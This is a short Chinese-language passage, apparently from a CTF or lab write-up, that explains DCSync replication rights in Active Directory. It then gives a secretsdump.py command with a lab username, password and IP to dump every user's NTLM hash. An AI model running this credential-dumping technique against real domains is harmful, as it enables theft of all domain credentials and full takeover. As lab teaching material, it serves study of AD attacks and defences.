**核心概念：**

### 账户被赋予了 **DCSync 权限**（全称 Replicating Directory Changes），这个权限原本是给"域控之间互相同步数据"用的，但被滥用的话，任何拥有这个权限的普通用户账户都可以**冒充域控**去向其他域控索要整个 AD 数据库的副本——这包括**所有用户的 NTLM 密码哈希**。

### 因为拥有这个特殊权限，它实际上等于拥有了**整个 AD 域的密钥**。

**怎么利用：**

直接跑 `secretsdump.py` 转储整个 AD 数据库的哈希：

bash

```bash
secretsdump.py spookysec.local/backup:'backup2517860'@10.48.130.9 -dc-ip 10.48.130.9
```


